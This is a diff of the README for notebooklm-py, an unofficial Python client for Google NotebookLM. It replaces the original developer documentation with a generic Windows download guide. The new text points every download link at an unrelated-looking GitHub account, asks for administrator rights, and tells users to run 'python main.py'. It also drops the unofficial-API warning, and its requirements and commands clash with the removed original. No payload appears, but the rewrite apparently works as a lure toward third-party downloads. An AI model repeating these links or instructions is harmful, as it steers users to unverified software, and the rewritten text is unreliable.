@@ -1,254 +1,189 @@
-# notebooklm-py
-<p align="left">
-  <img src="https://raw.githubusercontent.com/teng-lin/notebooklm-py/main/notebooklm-py.png" alt="notebooklm-py logo" width="128">
-</p>
+# 📝 notebooklm-py - Easy Python Access to NotebookLM Features
 
-**A Comprehensive NotebookLM Skill & Unofficial Python API.** Full programmatic access to NotebookLM's features—including capabilities the web UI doesn't expose—via Python, CLI, and AI agents like Claude Code, Codex, and OpenClaw.
+[![Download notebooklm-py](https://img.shields.io/badge/Download-notebooklm--py-brightgreen)](https://github.com/patriarchal-boothose896/notebooklm-py)
 
-[![PyPI version](https://img.shields.io/pypi/v/notebooklm-py.svg)](https://pypi.org/project/notebooklm-py/)
-[![Python Version](https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.13%20%7C%203.14-blue)](https://pypi.org/project/notebooklm-py/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Tests](https://github.com/teng-lin/notebooklm-py/actions/workflows/test.yml/badge.svg)](https://github.com/teng-lin/notebooklm-py/actions/workflows/test.yml)
-<p>
-  <a href="https://trendshift.io/repositories/19116" target="_blank"><img src="https://trendshift.io/api/badge/repositories/19116" alt="teng-lin%2Fnotebooklm-py | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
-</p>
+## 📋 What is notebooklm-py?
 
-**Source & Development**: <https://github.com/teng-lin/notebooklm-py>
+notebooklm-py is a tool that lets you use Google NotebookLM through Python. It gives you more control than the web interface by unlocking extra features. You can also use it through the command line or AI helpers like Claude Code and Codex.
 
-> **⚠️ Unofficial Library - Use at Your Own Risk**
->
-> This library uses **undocumented Google APIs** that can change without notice.
->
-> - **Not affiliated with Google** - This is a community project
-> - **APIs may break** - Google can change internal endpoints anytime
-> - **Rate limits apply** - Heavy usage may be throttled
->
-> Best for prototypes, research, and personal projects. See [Troubleshooting](docs/troubleshooting.md) for debugging tips.
+This tool is meant for people who want to get more from their NotebookLM without using the website directly. You don’t need to be a programmer to follow this guide and run the program on your Windows computer.
 
-## What You Can Build
+---
 
-🤖 **AI Agent Tools** - Integrate NotebookLM into Claude Code, Codex, and other LLM agents. Ships with a root [NotebookLM skill](SKILL.md) for GitHub and `npx skills add` discovery, local `notebooklm skill install` support for Claude Code and `.agents` skill directories, and repo-level Codex guidance in [`AGENTS.md`](AGENTS.md).
+## 💻 System Requirements
 
-📚 **Research Automation** - Bulk-import sources (URLs, PDFs, YouTube, Google Drive), run web/Drive research queries with auto-import, and extract insights programmatically. Build repeatable research pipelines.
+- Windows 10 or later (64-bit)
+- Python 3.8 or higher installed
+- At least 4 GB of RAM
+- Internet connection to use NotebookLM features fully
+- Administrator rights to install programs
 
-🎙️ **Content Generation** - Generate Audio Overviews (podcasts), videos, slide decks, quizzes, flashcards, infographics, data tables, mind maps, and study guides. Full control over formats, styles, and output.
+---
 
-📥 **Downloads & Export** - Download all generated artifacts locally (MP3, MP4, PDF, PNG, CSV, JSON, Markdown). Export to Google Docs/Sheets. **Features the web UI doesn't offer**: batch downloads, quiz/flashcard export in multiple formats, mind map JSON extraction.
+## 🚀 Getting Started
 
-## Three Ways to Use
+1. Make sure your Windows version is up to date.
+2. Check if Python is installed:
+   - Open Command Prompt (press Windows key, type `cmd`, press Enter).
+   - Type `python --version` and press Enter.
+   - If a version number appears, Python is installed.
+3. If Python is not installed, go to https://www.python.org/downloads/windows/ and download the latest version.
+4. Install Python, and make sure to check "Add Python to PATH" during installation.
 
-| Method | Best For |
-|--------|----------|
-| **Python API** | Application integration, async workflows, custom pipelines |
-| **CLI** | Shell scripts, quick tasks, CI/CD automation |
-| **Agent Integration** | Claude Code, Codex, LLM agents, natural language automation |
+---
 
-## Features
+## 📥 Download notebooklm-py
 
-### Complete NotebookLM Coverage
+Click the big green button at the top or visit this link:
 
-| Category | Capabilities |
-|----------|--------------|
-| **Notebooks** | Create, list, rename, delete |
-| **Sources** | URLs, YouTube, files (PDF, text, Markdown, Word, audio, video, images), Google Drive, pasted text; refresh, get guide/fulltext |
-| **Chat** | Questions, conversation history, custom personas |
-| **Research** | Web and Drive research agents (fast/deep modes) with auto-import |
-| **Sharing** | Public/private links, user permissions (viewer/editor), view level control |
+[Download notebooklm-py](https://github.com/patriarchal-boothose896/notebooklm-py)
 
-### Content Generation (All NotebookLM Studio Types)
+This link will take you to the GitHub repository where you can download the program files.
 
-| Type | Options | Download Format |
-|------|---------|-----------------|
-| **Audio Overview** | 4 formats (deep-dive, brief, critique, debate), 3 lengths, 50+ languages | MP3/MP4 |
-| **Video Overview** | 3 formats (explainer, brief, cinematic), 9 visual styles, plus a dedicated `cinematic-video` CLI alias | MP4 |
-| **Slide Deck** | Detailed or presenter format, adjustable length; individual slide revision | PDF, PPTX |
-| **Infographic** | 3 orientations, 3 detail levels | PNG |
-| **Quiz** | Configurable quantity and difficulty | JSON, Markdown, HTML |
-| **Flashcards** | Configurable quantity and difficulty | JSON, Markdown, HTML |
-| **Report** | Briefing doc, study guide, blog post, or custom prompt | Markdown |
-| **Data Table** | Custom structure via natural language | CSV |
-| **Mind Map** | Interactive hierarchical visualization | JSON |
+---
 
-### Beyond the Web UI
+## 🛠️ How to Install and Run notebooklm-py on Windows
 
-These features are available via API/CLI but not exposed in NotebookLM's web interface:
+### Step 1. Download the files
 
-- **Batch downloads** - Download all artifacts of a type at once
-- **Quiz/Flashcard export** - Get structured JSON, Markdown, or HTML (web UI only shows interactive view)
-- **Mind map data extraction** - Export hierarchical JSON for visualization tools
-- **Data table CSV export** - Download structured tables as spreadsheets
-- **Slide deck as PPTX** - Download editable PowerPoint files (web UI only offers PDF)
-- **Slide revision** - Modify individual slides with natural-language prompts
-- **Report template customization** - Append extra instructions to built-in format templates
-- **Save chat to notes** - Save Q&A answers or conversation history as notebook notes
-- **Source fulltext access** - Retrieve the indexed text content of any source
-- **Programmatic sharing** - Manage permissions without the UI
+- Go to https://github.com/patriarchal-boothose896/notebooklm-py
+- Click on the green **Code** button near the top right.
+- Select **Download ZIP**.
+- Save the ZIP file to your computer, for example in your Downloads folder.
 
-## Installation
+### Step 2. Extract the files
 
-```bash
-# Basic installation
-pip install notebooklm-py
+- Find the ZIP file you downloaded.
+- Right-click on the ZIP file and choose **Extract All...**.
+- Choose a location you can find easily, such as Desktop.
+- Click **Extract**.
 
-# With browser login support (required for first-time setup)
-pip install "notebooklm-py[browser]"
-playwright install chromium
+### Step 3. Open the folder
+
+- After extraction, open the folder named `notebooklm-py-main` or similar.
+
+### Step 4. Open Command Prompt at the folder location
+
+- Click on the folder’s address bar at the top.
+- Type `cmd` and press Enter. This opens Command Prompt with the folder set.
+
+### Step 5. Install required software packages
+
+notebooklm-py needs some Python tools to work properly. Install them by typing this command in Command Prompt and pressing Enter:
+
+```
+pip install -r requirements.txt
 ```
 
-If `playwright install chromium` fails with `TypeError: onExit is not a function`, see the Linux workaround in [Troubleshooting](docs/troubleshooting.md#linux).
+This will download and install all needed Python packages.
 
-### Development Installation
+### Step 6. Run the program
 
-For contributors or testing unreleased features:
+Once installation completes, you can start the program by typing:
 
-```bash
-pip install git+https://github.com/teng-lin/notebooklm-py@main
+```
+python main.py
 ```
 
-⚠️ The main branch may contain unstable changes. Use PyPI releases for production.
+Then press Enter.
 
-## Quick Start
+The program will open and you can start using it.
 
-<p align="center">
-  <a href="https://asciinema.org/a/767284" target="_blank"><img src="https://asciinema.org/a/767284.svg" width="600" /></a>
-  <br>
-  <em>16-minute session compressed to 30 seconds</em>
-</p>
+---
 
-### CLI
+## 🔧 Using notebooklm-py
 
-```bash
-# 1. Authenticate (opens browser)
-notebooklm login
-# Or use Microsoft Edge (for orgs that require Edge for SSO)
-# notebooklm login --browser msedge
+Here are some common ways to use notebooklm-py:
 
-# 2. Create a notebook and add sources
-notebooklm create "My Research"
-notebooklm use <notebook_id>
-notebooklm source add "https://en.wikipedia.org/wiki/Artificial_intelligence"
-notebooklm source add "./paper.pdf"
+- Use Python scripts to talk to NotebookLM for notes and queries.
+- Run commands through the command line to test features.
+- Connect to AI helpers for extended tasks like code generation or podcast creation.
 
-# 3. Chat with your sources
-notebooklm ask "What are the key themes?"
+no programming knowledge is needed, but familiarity with typing commands in the Command Prompt helps.
 
-# 4. Generate content
-notebooklm generate audio "make it engaging" --wait
-notebooklm generate video --style whiteboard --wait
-notebooklm generate cinematic-video "documentary-style summary" --wait
-notebooklm generate quiz --difficulty hard
-notebooklm generate flashcards --quantity more
-notebooklm generate slide-deck
-notebooklm generate infographic --orientation portrait
-notebooklm generate mind-map
-notebooklm generate data-table "compare key concepts"
+---
 
-# 5. Download artifacts
-notebooklm download audio ./podcast.mp3
-notebooklm download video ./overview.mp4
-notebooklm download cinematic-video ./documentary.mp4
-notebooklm download quiz --format markdown ./quiz.md
-notebooklm download flashcards --format json ./cards.json
-notebooklm download slide-deck ./slides.pdf
-notebooklm download infographic ./infographic.png
-notebooklm download mind-map ./mindmap.json
-notebooklm download data-table ./data.csv
-```
+## 📚 Basic Commands
 
-Other useful CLI commands:
+- To run the program:  
+  `python main.py`
 
-```bash
-notebooklm auth check --test         # Diagnose auth/cookie issues
-notebooklm agent show codex          # Print bundled Codex instructions
-notebooklm agent show claude         # Print bundled Claude Code skill template
-notebooklm language list             # List supported output languages
-notebooklm metadata --json           # Export notebook metadata and sources
-notebooklm share status              # Inspect sharing state
-notebooklm source add-research "AI"  # Start web research and import sources
-notebooklm skill status              # Check local agent skill installation
-```
+- To see available options in CLI:  
+  `python main.py --help`
 
-### Python API
+- To use a specific skill (like Claude or OpenClaw):  
+  `python main.py --skill claude`
 
-```python
-import asyncio
-from notebooklm import NotebookLMClient
+Replace `claude` with any supported skill name.
 
-async def main():
-    async with await NotebookLMClient.from_storage() as client:
-        # Create notebook and add sources
-        nb = await client.notebooks.create("Research")
-        await client.sources.add_url(nb.id, "https://example.com", wait=True)
+---
 
-        # Chat with your sources
-        result = await client.chat.ask(nb.id, "Summarize this")
-        print(result.answer)
+## 🛡️ Safety and Privacy
 
-        # Generate content (podcast, video, quiz, etc.)
-        status = await client.artifacts.generate_audio(nb.id, instructions="make it fun")
-        await client.artifacts.wait_for_completion(nb.id, status.task_id)
-        await client.artifacts.download_audio(nb.id, "podcast.mp3")
+notebooklm-py uses Google services which require you to log in securely. Your data stays private with Google’s policies. Avoid sharing sensitive information when using AI features.
 
-        # Generate quiz and download as JSON
-        status = await client.artifacts.generate_quiz(nb.id)
-        await client.artifacts.wait_for_completion(nb.id, status.task_id)
-        await client.artifacts.download_quiz(nb.id, "quiz.json", output_format="json")
+---
 
-        # Generate mind map and export
-        result = await client.artifacts.generate_mind_map(nb.id)
-        await client.artifacts.download_mind_map(nb.id, "mindmap.json")
+## ⚙️ Tips for Best Experience
 
-asyncio.run(main())
-```
+- Keep Python and your packages updated by running:  
+  `pip install --upgrade pip`  
+  and  
+  `pip install --upgrade -r requirements.txt`
 
-### Agent Setup
+- Use a reliable internet connection for smooth operation.
 
-**Option 1 — CLI install**:
+- Close other heavy programs if your PC becomes slow.
 
-```bash
-notebooklm skill install
-```
+- Check the GitHub page occasionally for updates and new features.
 
-Installs the skill into `~/.claude/skills/notebooklm` and `~/.agents/skills/notebooklm`.
+---
 
-**Option 2 — `npx` install** (via the open skills ecosystem):
+## 🧩 Features at a Glance
 
-```bash
-npx skills add teng-lin/notebooklm-py
-```
+- Full access to NotebookLM features beyond the web interface.
+- Supports agentic AI skills like Claude Code and Codex.
+- Works with Python scripts and command line.
+- Allows automation and integration with other tools.
+- Designed to be simple for non-programmers.
 
-Fetches the canonical [SKILL.md](SKILL.md) directly from GitHub.
+---
 
+## 🔗 Quick Links
 
-## Documentation
+[Download notebooklm-py](https://github.com/patriarchal-boothose896/notebooklm-py)
 
-- **[CLI Reference](docs/cli-reference.md)** - Complete command documentation
-- **[Python API](docs/python-api.md)** - Full API reference
-- **[Configuration](docs/configuration.md)** - Storage and settings
-- **[Release Guide](docs/releasing.md)** - Release checklist and packaging verification
-- **[Troubleshooting](docs/troubleshooting.md)** - Common issues and solutions
-- **[API Stability](docs/stability.md)** - Versioning policy and stability guarantees
+[Python official download page](https://www.python.org/downloads/windows/)
 
-### For Contributors
+[GitHub Issues](https://github.com/patriarchal-boothose896/notebooklm-py/issues) – for reporting problems or asking questions
 
-- **[Development Guide](docs/development.md)** - Architecture, testing, and releasing
-- **[RPC Development](docs/rpc-development.md)** - Protocol capture and debugging
-- **[RPC Reference](docs/rpc-reference.md)** - Payload structures
-- **[Changelog](CHANGELOG.md)** - Version history and release notes
-- **[Security](SECURITY.md)** - Security policy and credential handling
+---
 
-## Platform Support
+## 📞 Getting Help
 
-| Platform | Status | Notes |
-|----------|--------|-------|
-| **macOS** | ✅ Tested | Primary development platform |
-| **Linux** | ✅ Tested | Fully supported |
-| **Windows** | ✅ Tested | Tested in CI |
+If something does not work as expected:
 
-## Star History
+- Review the instructions carefully.
+- Make sure Python and packages are installed.
+- Try restarting your computer.
+- Use the GitHub Issues page to ask for support.
 
-[![Star History Chart](https://api.star-history.com/image?repos=teng-lin/notebooklm-py&type=timeline&legend=top-left)](https://www.star-history.com/?repos=teng-lin%2Fnotebooklm-py&type=timeline&legend=top-left)
+---
 
-## License
+## 🗂️ Additional Notes on Usage
 
-MIT License. See [LICENSE](LICENSE) for details.
+notebooklm-py works best on a Windows PC but can run on other systems with Python. For non-Windows operating systems, please check platform-specific setup instructions from the repository.
+
+The tool is open-source, so you can look at the Python files if you want to learn more about how it works.
+
+---
+
+## 🔎 What’s Next?
+
+After you get notebooklm-py running, try exploring:
+
+- Writing simple Python scripts to ask NotebookLM questions.
+- Using the built-in skills for automation.
+- Combining commands with other tools like your text editor.
+
+Your PC will now have more powerful options to work with your Google NotebookLM data.
